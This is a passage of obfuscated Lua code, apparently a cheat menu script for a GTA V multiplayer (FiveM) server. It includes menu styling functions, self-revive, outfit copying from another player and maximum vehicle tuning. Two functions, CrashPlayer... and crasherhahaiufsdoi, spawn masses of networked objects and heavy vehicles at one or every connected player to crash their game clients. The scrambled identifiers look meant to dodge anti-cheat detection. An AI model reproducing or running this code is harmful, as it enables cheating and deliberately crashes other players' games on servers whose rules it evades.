            optionCountyiudtfiusdfs = 0
        end
    end
end


function kaeogkeargmioergoeismgsdfg.SetMenuWidthksjhdjfsdf(id, width)
    setMenuPropertydfjghdfkgdklfg(id, 'width', width)
end


function kaeogkeargmioergoeismgsdfg.SetMenuXsdjkhflsdf(id, x)
    setMenuPropertydfjghdfkgdklfg(id, 'x', x)
end


function kaeogkeargmioergoeismgsdfg.SetMenuYdsuihfsdof(id, y)
    setMenuPropertydfjghdfkgdklfg(id, 'y', y)
end


function kaeogkeargmioergoeismgsdfg.SetMenuMaxoptionCountyiudtfiusdfsOnScreensdiuhfuoisdf(id, count)
    setMenuPropertydfjghdfkgdklfg(id, 'maxoptionCountyiudtfiusdfs', count)
end


function kaeogkeargmioergoeismgsdfg.Settitleshdkgfjkisdfsdfisdhgfisdf(id, titleshdkgfjkisdfsdf)
    setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdf', titleshdkgfjkisdfsdf)
end


function kaeogkeargmioergoeismgsdfg.SettitleshdkgfjkisdfsdfColorsdjhfgsidf(id, r, g, b, a)
    setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menusjhfkdgdfg[id].titleshdkgfjkisdfsdfColor.a })
end


function kaeogkeargmioergoeismgsdfg.SettitleshdkgfjkisdfsdfBackgroundColorfdsjkhgdkifg(id, r, g, b, a)
    setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menusjhfkdgdfg[id].titleshdkgfjkisdfsdfBackgroundColor.a })
end


function kaeogkeargmioergoeismgsdfg.SettitleshdkgfjkisdfsdfBackgroundSpritejhgdjfklgdfg(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfBackgroundSprite', { dict = textureDict, name = textureName })
end


function kaeogkeargmioergoeismgsdfg.SetSubtitleshdkgfjkisdfsdfjkfhgdfgfgfdgkjhdfgfg(id, text)
    setMenuPropertydfjghdfkgdklfg(id, 'subtitleshdkgfjkisdfsdf', string.upper(text))
end


function kaeogkeargmioergoeismgsdfg.SetmenuBackgroundColorsdiufgksdfsdf(id, r, g, b, a)
    setMenuPropertydfjghdfkgdklfg(id, 'menuBackgroundColorsdiufgksdfsdf', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menusjhfkdgdfg[id].menuBackgroundColorsdiufgksdfsdf.a })
end


function kaeogkeargmioergoeismgsdfg.SetmenuTextColorjhaisfdikaushfudsfjhdsgffdlgdfg(id, r, g, b, a)
    setMenuPropertydfjghdfkgdklfg(id, 'menuTextColorjhaisfdikaushfudsf', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menusjhfkdgdfg[id].menuTextColorjhaisfdikaushfudsf.a })
end

function kaeogkeargmioergoeismgsdfg.SetmenusjhfkdgdfgubTextColorjkhdgfbkjdfg(id, r, g, b, a)
    setMenuPropertydfjghdfkgdklfg(id, 'menusjhfkdgdfgubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menusjhfkdgdfg[id].menusjhfkdgdfgubTextColor.a })
end

function kaeogkeargmioergoeismgsdfg.SetMenuFocusColorsdjkhgflkfdg(id, r, g, b, a)
    setMenuPropertydfjghdfkgdklfg(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menusjhfkdgdfg[id].menuFocusColor.a })
end


function kaeogkeargmioergoeismgsdfg.SetehrtuydfbweeweghdPressedSound(id, name, set)
    setMenuPropertydfjghdfkgdklfg(id, 'PrzyciskxdduygsfusidgfysdfPressedSound', { ['name'] = name, ['set'] = set })
end

function getEntitysjudifhyisdfdsf(player)
    local resultdlkjghdfgf, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

local function bfsdijouhgyoidfgdfg(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(6)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    drawTextdsifhgsdfsdf(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
 end

 local function drawcustomblipauhdsgfusidofdsfdfghijkfdgdfg()
    local ab=KeyboardInputdfjhfduhifudihdfg("Enter Blip Name","",100)
    if ab==""then 
        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~r~Invalid Blip Name!")
        return drawcustomblipauhdsgfusidofdsfdfghijkfdgdfg()
    else 
        local bh=KeyboardInputdfjhfduhifudihdfg("Enter X pos","",100)
        local bi=KeyboardInputdfjhfduhifudihdfg("Enter Y pos","",100)
        local bj=KeyboardInputdfjhfduhifudihdfg("Enter Z pos","",100)
        if bh~=""and bi~=""and bj~=""then 
            local bl={{colour=75,model=84}}
            for _,bm in pairs(bl)do bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR=AddBlipForCoord(bh+0.5,bi+0.5,bj+0.5)
                SetBlipSprite(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.model)SetBlipDisplay(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,4)
                SetBlipScale(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,0.9)SetBlipColour(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.colour)SetBlihaslokurwa78346ygfrsfsdhortRange(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,true)BeginTextCommandSetBlipName("STRING")
                AddTextComponentString(ab)
                EndTextCommandSetBlipName(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR)end 
            else 
                drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~r~Invalid coords!")
            end
        end 
    end
	
function jhgdfusfdgdfljgnldfg(HzrWJelKRFL, vn6uFW)
    if vn6uFW then
        local rd4JRDIAkW3g = 10 ^ vn6uFW
        return math.floor((HzrWJelKRFL * rd4JRDIAkW3g) + 0.5) / (rd4JRDIAkW3g)
    else
        return math.floor(HzrWJelKRFL + 0.5)
    end
end

function uhdisfsdf(i8CKVc, wPHjsIoyC9, iCQfY4n)
    SetEntityCoordsNoOffset(i8CKVc, wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z, false, false, false, true)
    NetworkResurrectLocalPlayer(wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z, iCQfY4n, true, false)
    SetPlayerInvincible(i8CKVc, false)
    hsrtghsrtgsrthrth(false, "playerSpawned", wPHjsIoyC9.x, wPHjsIoyC9.y, wPHjsIoyC9.z)
    ClearPedBloodDamage(i8CKVc)
end

function huiytdgsyfuyisdyiyodfoisf()
    local zLXwr6t9ybAtDp = GetEntityCoords(PlayerPedId())
    local sKquZDsjk7h0GINR = {
        x = jhgdfusfdgdfljgnldfg(zLXwr6t9ybAtDp.x, 1),
        y = jhgdfusfdgdfljgnldfg(zLXwr6t9ybAtDp.y, 1),
        z = jhgdfusfdgdfljgnldfg(zLXwr6t9ybAtDp.z, 1)
    }
    uhdisfsdf(PlayerPedId(), sKquZDsjk7h0GINR, 0)
    StopScreenEffect("DeathFailOut")
    drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Revived!")
end
            function trim(DpZKlLTPj8i8pij)
                if DpZKlLTPj8i8pij then
                    return (string.gsub(DpZKlLTPj8i8pij, "^%s*(.-)%s*$", "%1"))
                else
                    return nil
                end
            end

function GetVehiclePropertiessdjhiudfgdfgdfg(GNYTV3XnUFoxdun8mV)
                local qguZRn, GDb1Z0ud5kL = GetVehicleColours(GNYTV3XnUFoxdun8mV)
                local hhCmXXD1_h_ZoB6227Ln, ScRA7BWOXoEADv = GetVehicleExtraColours(GNYTV3XnUFoxdun8mV)
                local uO = {}
                for id = 0.0, 12 do
                    if DoesExtraExist(GNYTV3XnUFoxdun8mV, id) then
                        local wn1Ioy2PN4k = IsVehicleExtraTurnedOn(GNYTV3XnUFoxdun8mV, id) == 1
                        uO[tostring(id)] = wn1Ioy2PN4k
                    end
                end
                return {
                    model = GetEntityModel(GNYTV3XnUFoxdun8mV),
                    plate = trim(GetVehicleNumberPlateText(GNYTV3XnUFoxdun8mV)),
                    plateIndex = GetVehicleNumberPlateTextIndex(GNYTV3XnUFoxdun8mV),
                    health = GetEntityMaxHealth(GNYTV3XnUFoxdun8mV),
                    dirtLevel = GetVehicleDirtLevel(GNYTV3XnUFoxdun8mV),
                    color1 = qguZRn,
                    color2 = GDb1Z0ud5kL,
                    pearlescentColor = hhCmXXD1_h_ZoB6227Ln,
                    wheelColor = ScRA7BWOXoEADv,
                    wheels = GetVehicleWheelType(GNYTV3XnUFoxdun8mV),
                    windowTint = GetVehicleWindowTint(GNYTV3XnUFoxdun8mV),
                    neonEnabled = {
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 0.0),
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 1),
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 2),
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 3)
                    },
                    extras = uO,
                    neonColor = table.pack(GetVehicleNeonLightsColour(GNYTV3XnUFoxdun8mV)),
                    tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(GNYTV3XnUFoxdun8mV)),
                    modSpoilers = GetVehicleMod(GNYTV3XnUFoxdun8mV, 0.0),
                    modFrontBumper = GetVehicleMod(GNYTV3XnUFoxdun8mV, 1),
                    modRearBumper = GetVehicleMod(GNYTV3XnUFoxdun8mV, 2),
                    modSideSkirt = GetVehicleMod(GNYTV3XnUFoxdun8mV, 3),
                    modExhaust = GetVehicleMod(GNYTV3XnUFoxdun8mV, 4),
                    modFrame = GetVehicleMod(GNYTV3XnUFoxdun8mV, 5),
                    modGrille = GetVehicleMod(GNYTV3XnUFoxdun8mV, 6),
                    modHood = GetVehicleMod(GNYTV3XnUFoxdun8mV, 7),
                    modFender = GetVehicleMod(GNYTV3XnUFoxdun8mV, 8),
                    modRightFender = GetVehicleMod(GNYTV3XnUFoxdun8mV, 9),
                    modRoof = GetVehicleMod(GNYTV3XnUFoxdun8mV, 10),
                    modEngine = GetVehicleMod(GNYTV3XnUFoxdun8mV, 11),
                    modBrakes = GetVehicleMod(GNYTV3XnUFoxdun8mV, 12),
                    modTransmission = GetVehicleMod(GNYTV3XnUFoxdun8mV, 13),
                    modHorns = GetVehicleMod(GNYTV3XnUFoxdun8mV, 14),
                    modSuspension = GetVehicleMod(GNYTV3XnUFoxdun8mV, 15),
                    modArmor = GetVehicleMod(GNYTV3XnUFoxdun8mV, 16),
                    modTurbo = IsToggleModOn(GNYTV3XnUFoxdun8mV, 18),
                    modSmokeEnabled = IsToggleModOn(GNYTV3XnUFoxdun8mV, 20),
                    modXenon = IsToggleModOn(GNYTV3XnUFoxdun8mV, 22),
                    modFrontWheels = GetVehicleMod(GNYTV3XnUFoxdun8mV, 23),
                    modBackWheels = GetVehicleMod(GNYTV3XnUFoxdun8mV, 24),
                    modPlateHolder = GetVehicleMod(GNYTV3XnUFoxdun8mV, 25),
                    modVanityPlate = GetVehicleMod(GNYTV3XnUFoxdun8mV, 26),
                    modTrimA = GetVehicleMod(GNYTV3XnUFoxdun8mV, 27),
                    modOrnaments = GetVehicleMod(GNYTV3XnUFoxdun8mV, 28),
                    modDashboard = GetVehicleMod(GNYTV3XnUFoxdun8mV, 29),
                    modDial = GetVehicleMod(GNYTV3XnUFoxdun8mV, 30),
                    modDoorSpeaker = GetVehicleMod(GNYTV3XnUFoxdun8mV, 31),
                    modSeats = GetVehicleMod(GNYTV3XnUFoxdun8mV, 32),
                    modSteeringWheel = GetVehicleMod(GNYTV3XnUFoxdun8mV, 33),
                    modShifterLeavers = GetVehicleMod(GNYTV3XnUFoxdun8mV, 34),
                    modAPlate = GetVehicleMod(GNYTV3XnUFoxdun8mV, 35),
                    modSpeakers = GetVehicleMod(GNYTV3XnUFoxdun8mV, 36),
                    modTrunk = GetVehicleMod(GNYTV3XnUFoxdun8mV, 37),
                    modHydrolic = GetVehicleMod(GNYTV3XnUFoxdun8mV, 38),
                    modEngineBlock = GetVehicleMod(GNYTV3XnUFoxdun8mV, 39),
                    modAirFilter = GetVehicleMod(GNYTV3XnUFoxdun8mV, 40),
                    modStruts = GetVehicleMod(GNYTV3XnUFoxdun8mV, 41),
                    modArchCover = GetVehicleMod(GNYTV3XnUFoxdun8mV, 42),
                    modAerials = GetVehicleMod(GNYTV3XnUFoxdun8mV, 43),
                    modTrimB = GetVehicleMod(GNYTV3XnUFoxdun8mV, 44),
                    modTank = GetVehicleMod(GNYTV3XnUFoxdun8mV, 45),
                    modWindows = GetVehicleMod(GNYTV3XnUFoxdun8mV, 46),
                    modLivery = GetVehicleLivery(GNYTV3XnUFoxdun8mV)
                }
            end

function UbierzSieXD743685345dfjkhlglkffg(target)
		local ped = GetPlayerPed(target)
		local me = PlayerPedId()
		
		hat = GetPedPropIndex(ped, 0)
		hat_texture = GetPedPropTextureIndex(ped, 0)
		
		glasses = GetPedPropIndex(ped, 1)
		glasses_texture = GetPedPropTextureIndex(ped, 1)
		
		ear = GetPedPropIndex(ped, 2)
		ear_texture = GetPedPropTextureIndex(ped, 2)
		
		watch = GetPedPropIndex(ped, 6)
		watch_texture = GetPedPropTextureIndex(ped, 6)
		
		wrist = GetPedPropIndex(ped, 7)
		wrist_texture = GetPedPropTextureIndex(ped, 7)
		
		head_drawable = GetPedDrawableVariation(ped, 0)
		head_palette = GetPedPaletteVariation(ped, 0)
		head_texture = GetPedTextureVariation(ped, 0)
		
		beard_drawable = GetPedDrawableVariation(ped, 1)
		beard_palette = GetPedPaletteVariation(ped, 1)
		beard_texture = GetPedTextureVariation(ped, 1)
		
		hair_drawable = GetPedDrawableVariation(ped, 2)
		hair_palette = GetPedPaletteVariation(ped, 2)
		hair_texture = GetPedTextureVariation(ped, 2)
		
		torso_drawable = GetPedDrawableVariation(ped, 3)
		torso_palette = GetPedPaletteVariation(ped, 3)
		torso_texture = GetPedTextureVariation(ped, 3)
		
		legs_drawable = GetPedDrawableVariation(ped, 4)
		legs_palette = GetPedPaletteVariation(ped, 4)
		legs_texture = GetPedTextureVariation(ped, 4)
		
		hands_drawable = GetPedDrawableVariation(ped, 5)
		hands_palette = GetPedPaletteVariation(ped, 5)
		hands_texture = GetPedTextureVariation(ped, 5)
		
		foot_drawable = GetPedDrawableVariation(ped, 6)
		foot_palette = GetPedPaletteVariation(ped, 6)
		foot_texture = GetPedTextureVariation(ped, 6)
		
		acc1_drawable = GetPedDrawableVariation(ped, 7)
		acc1_palette = GetPedPaletteVariation(ped, 7)
		acc1_texture = GetPedTextureVariation(ped, 7)
		
		acc2_drawable = GetPedDrawableVariation(ped, 8)
		acc2_palette = GetPedPaletteVariation(ped, 8)
		acc2_texture = GetPedTextureVariation(ped, 8)
		
		acc3_drawable = GetPedDrawableVariation(ped, 9)
		acc3_palette = GetPedPaletteVariation(ped, 9)
		acc3_texture = GetPedTextureVariation(ped, 9)
		
		mask_drawable = GetPedDrawableVariation(ped, 10)
		mask_palette = GetPedPaletteVariation(ped, 10)
		mask_texture = GetPedTextureVariation(ped, 10)
		
		aux_drawable = GetPedDrawableVariation(ped, 11)
		aux_palette = GetPedPaletteVariation(ped, 11) 	
		aux_texture = GetPedTextureVariation(ped, 11)

		SetPedPropIndex(me, 0, hat, hat_texture, 1)
		SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
		SetPedPropIndex(me, 2, ear, ear_texture, 1)
		SetPedPropIndex(me, 6, watch, watch_texture, 1)
		SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
		
		SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
		SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
		SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
		SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
		SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
		SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
		SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
		SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
		SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
		SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
		SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
		SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
	end

function KurwaMaxTuningJAPIACELOksjdbnfglsdfd(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function KurwaMaxTuningSilnikaJAPIACELOksjdbnfglsdfd(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end

function CrashPlayeryigdsifudsgfdgfdlkjhgjdkhdf(ped)
    local playerPos = GetEntityCoords(ped, false)
    local modelHashessiughfdgfdg = {
        0x34315488, 
        0x6A27FEB1, 0xCB2ACC8, 
        0xC6899CDE, 0xD14B5BA3, 
        0xD9F4474C, 0x32A9996C, 
        0x69D4F974, 0xCAFC1EC3, 
        0x79B41171, 0x1075651, 
        0xC07792D4, 0x781E451D, 
        0x762657C6, 0xC2E75A21, 
        0xC3C00861, 0x81FB3FF0, 
        0x45EF7804, 0xE65EC0E4, 
        0xE764D794, 0xFBF7D21F, 
        0xE1AEB708, 0xA5E3D471, 
        0xD971BBAE, 0xCF7A9A9D, 
        0xC2CC99D8, 0x8FB233A4, 
        0x24E08E1F, 0x337B2B54, 
        0xB9402F87, 0x4F2526DA 
    }

    for i = 1, #modelHashessiughfdgfdg do
        objfdgjhkfdg = CreateObject(modelHashessiughfdgfdg[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
    end 
end

function chiuiufdsfiuhfdfdhuidfgu(C,x,y)
    SetTextFont(6)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    drawTextdsifhgsdfsdf(x,y)
end

function crasherhahaiufsdoi()
	local camion = "phantom"
	local avion = "CARGOPLANE"
	local avion2 = "luxor"
	local heli = "maverick"
	local random = "bus"
	for i = 0, 128 do
			local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
			CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
			CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
			CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
			CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
	end
end

local function getPlayerIdssdkghldifugdfg()
    local players = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end

function drawTextdsifhgsdfsdf3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(6)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    drawTextdsifhgsdfsdf(0.0, 0.0)
    ClearDrawOrigin()
end

function KeyboardInputdfjhfduhifudihdfg(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local resultdlkjghdfgf = GetOnscreenKeyboardResult()
